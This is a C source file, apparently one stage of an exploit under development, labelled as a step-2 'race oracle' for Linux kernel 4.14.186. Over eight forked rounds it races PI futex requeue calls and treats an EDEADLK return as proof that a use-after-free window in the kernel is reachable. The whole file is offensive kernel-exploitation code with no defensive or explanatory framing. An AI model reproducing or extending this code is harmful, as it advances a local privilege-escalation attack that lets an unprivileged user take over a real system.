/*
 * race_oracle_v2.c — fixed: counts EDEADLK on EITHER waiter or requeue
 * as proof the PI deadlock path is reachable (what v4.txt calls "fires").
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <stdint.h>
#include <stdatomic.h>
#include <sched.h>
#include <sys/wait.h>
static uint32_t fw,ft,fc;
static atomic_int ready,waiting,started,consumed;
static atomic_int requeue_errno, waiter_errno;
static void* th_owner(void*a){(void)a; syscall(SYS_futex,&ft,FUTEX_LOCK_PI,0,NULL,NULL,0); atomic_store(&ready,1); while(!atomic_load(&started)) usleep(200); syscall(SYS_futex,&fc,FUTEX_LOCK_PI,0,NULL,NULL,0); return NULL;}
static void* th_waiter(void*a){(void)a; syscall(SYS_futex,&fc,FUTEX_LOCK_PI,0,NULL,NULL,0); atomic_store(&ready,1); while(!atomic_load(&started)) usleep(200); struct timespec ts; clock_gettime(CLOCK_MONOTONIC,&ts); ts.tv_sec+=3; atomic_store(&waiting,1); errno=0; int r=syscall(SYS_futex,&fw,FUTEX_WAIT_REQUEUE_PI,0,&ts,&ft,0); atomic_store(&waiter_errno, r==-1?errno:0); while(!atomic_load(&consumed)) usleep(1000); return NULL;}
static int run_round(int n){
  fw=0;ft=0;fc=0; atomic_store(&ready,0); atomic_store(&waiting,0); atomic_store(&started,0); atomic_store(&consumed,0); atomic_store(&requeue_errno,0); atomic_store(&waiter_errno,0);
  pthread_t to,tw; pthread_create(&to,NULL,th_owner,NULL); pthread_create(&tw,NULL,th_waiter,NULL);
  while(!atomic_load(&waiting) || !atomic_load(&started)) usleep(500);
  usleep(50000);
  errno=0; long r=syscall(SYS_futex,&fw,FUTEX_CMP_REQUEUE_PI,1,(void*)1,&ft,0); int e= r==-1?errno:0; atomic_store(&requeue_errno,e);
  usleep(3500000); atomic_store(&consumed,1); pthread_join(tw,NULL); pthread_detach(to);
  int we=atomic_load(&waiter_errno); int re=atomic_load(&requeue_errno);
  int hit=(we==35||re==35);
  printf("[*] Round %2d: CMP_REQUEUE ret=%ld errno=%d | waiter errno=%d %s\n", n,r,re,we, hit?"<-- HIT EDEADLK":"");
  return hit;
}
int main(void){
  setbuf(stdout,NULL);
  cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof(cs),&cs);
  printf("\n=== Y75 Step2 race oracle v2 ===\n[*] V2117 4.14.186/paranoid -1 — any EDEADLK(35) counts as hit\n\n");
  int hits=0; for(int i=1;i<=8;i++){ pid_t p=fork(); if(p==0){ int h=run_round(i); _exit(h?0:1);} int st; waitpid(p,&st,0); if(WIFEXITED(st)&&WEXITSTATUS(st)==0) hits++; usleep(300000);} 
  printf("\n=== result %d/8 hit EDEADLK ===\n",hits);
  if(hits) printf("[+] UAF window REACHABLE — Step2 PASS (4.14 deadlock on requeue is the signal)\n"); else printf("[-] no EDEADLK\n");
  return hits?0:1;
}
